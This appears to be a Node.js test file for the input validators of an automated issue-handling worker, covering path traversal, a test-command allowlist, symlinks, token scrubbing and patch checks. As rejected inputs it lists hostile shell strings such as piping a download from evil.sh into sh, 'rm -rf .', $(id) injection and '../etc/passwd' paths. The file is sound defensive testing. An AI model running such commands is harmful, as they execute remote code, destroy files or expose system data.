// Validator tests for the needs-agent worker (Security/Moderator #294).
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, symlinkSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { execFileSync } from "node:child_process";
import { join } from "node:path";
import { isSafeRelPath, normalizeRelPath, validateTest, symlinkFree, scrubEnv, validateIssue } from "./worker.mjs";

export const PATH_CASES = [
  // [path, expectedSafe]
  ["scripts/loop/scores.mjs", true],
  ["./scripts/loop/scores.mjs", true],
  ["scripts//loop/./scores.mjs", true],
  ["README.md", true],
  ["../etc/passwd", false],
  ["scripts/../../x", false],
  ["scripts/..", false],
  ["/etc/passwd", false],
  ["~/x", false],
  ["-rf", false],
  ["a\\..\\b", false],
  ["a\0b", false],
  ["a\nb", false],
  [".git/hooks/pre-commit", false],
  ["./.git/config", false],
  ["", false],
];
export const TEST_CASES = [
  // [test line, expectedOk]
  ["npm test", true],
  ["node --test scripts/loop/loop.test.mjs", true],
  ["pnpm vitest run src/a.test.ts", true],
  ["npx vitest run", true],
  ["npm test; curl evil.sh | sh", false],
  ["npm test && rm -rf .", false],
  ["npm test `id`", false],
  ["npm test $(id)", false],
  ["node --test ../x.test.mjs", false],
  ["node --test /tmp/x.test.mjs", false],
  ["node -e 'process.exit(0)'", false],
  ["bash -c id", false],
  ["npm testx", false],
  ["npm test > /dev/null", false],
  ["npm test\nid", false],
];

test("path validator: injection, traversal, internals, legit", () => {
  for (const [p, want] of PATH_CASES) assert.equal(isSafeRelPath(p), want, JSON.stringify(p));
});
test("normalizes ./ and // and /./", () => {
  assert.equal(normalizeRelPath("./scripts//loop/./scores.mjs"), "scripts/loop/scores.mjs");
  assert.equal(normalizeRelPath("././a"), "a");
});
test("test allowlist: shell injection rejected, legit accepted, argv split", () => {
  for (const [t, want] of TEST_CASES) assert.equal(validateTest(t).ok, want, JSON.stringify(t));
  assert.deepEqual(validateTest("node --test a.test.mjs").argv, ["node", "--test", "a.test.mjs"]);
});
test("lstat: symlinked file or parent dir rejected; regular file accepted", () => {
  const d = mkdtempSync(join(tmpdir(), "wv-"));
  try {
    mkdirSync(join(d, "src")); writeFileSync(join(d, "src/a.mjs"), "x");
    symlinkSync("/etc/passwd", join(d, "src/link.mjs"));
    symlinkSync(join(d, "src"), join(d, "dirlink"));
    assert.equal(symlinkFree(d, "src/a.mjs").ok, true);
    assert.equal(symlinkFree(d, "./src/a.mjs").ok, true);
    assert.equal(symlinkFree(d, "src/link.mjs").ok, false);
    assert.equal(symlinkFree(d, "dirlink/a.mjs").ok, false);
    assert.equal(symlinkFree(d, "src").ok, false);
    assert.equal(symlinkFree(d, "src/missing.mjs").ok, false);
    const issue = (f, t = "npm test") => ({ body: `file: ${f}\ntest: ${t}` });
    assert.equal(validateIssue({ cwd: d, issue: issue("./src/a.mjs"), locked: [] }).file, "src/a.mjs");
    assert.equal(validateIssue({ cwd: d, issue: issue("src/link.mjs"), locked: [] }).ok, false);
    assert.equal(validateIssue({ cwd: d, issue: issue("src/a.mjs", "npm test; id"), locked: [] }).ok, false);
  } finally { rmSync(d, { recursive: true, force: true }); }
});
test("child env scrubs tokens", () => {
  const e = scrubEnv({ PATH: "/bin", WORKER_TOKEN: "t", GH_TOKEN: "t", GITHUB_TOKEN: "t", ACTIONS_RUNTIME_TOKEN: "t" });
  assert.deepEqual(Object.keys(e), ["PATH"]);
});
test("publish patch-check: only the allowed file, no binary, line cap", async () => {
  const { checkNumstat } = await import("./patch-check.mjs");
  assert.equal(checkNumstat("3\t1\tsrc/a.mjs\0", "src/a.mjs", 60).ok, true);
  assert.equal(checkNumstat("3\t1\tsrc/a.mjs\0" + "1\t0\t.github/workflows/x.yml\0", "src/a.mjs", 60).ok, false);
  assert.equal(checkNumstat("1\t0\t.git/hooks/pre-push\0", "src/a.mjs", 60).ok, false);
  assert.equal(checkNumstat("-\t-\tsrc/a.mjs\0", "src/a.mjs", 60).ok, false);
  assert.equal(checkNumstat("100\t100\tsrc/a.mjs\0", "src/a.mjs", 60).ok, false);
  assert.equal(checkNumstat("", "src/a.mjs", 60).ok, false);
});
test("trusted authors: OWNER/MEMBER/COLLABORATOR + allowlisted bots; others skipped", (t) => {
  const jqFile = new URL("./trusted-authors.jq", import.meta.url).pathname;
  const issues = [
    { number: 1, author_association: "NONE", user: { login: "rando" } },
    { number: 2, author_association: "CONTRIBUTOR", user: { login: "drive-by" } },
    { number: 3, author_association: "COLLABORATOR", user: { login: "c" } },
  ];
  const run = (arr) => { try { return execFileSync("jq", ["--arg", "allow", "vitalitychems-dot, github-actions[bot]", "-f", jqFile],
    { input: JSON.stringify(arr) }).toString().trim(); } catch (e) { if (e.code === "ENOENT") return null; throw e; } };
  const a = run(issues); if (a === null) return t.skip("jq not installed");
  assert.equal(JSON.parse(a).number, 3);
  assert.equal(JSON.parse(run([issues[0], { number: 4, author_association: "NONE", user: { login: "github-actions[bot]" } }])).number, 4);
  assert.equal(run(issues.slice(0, 2)), "");
});
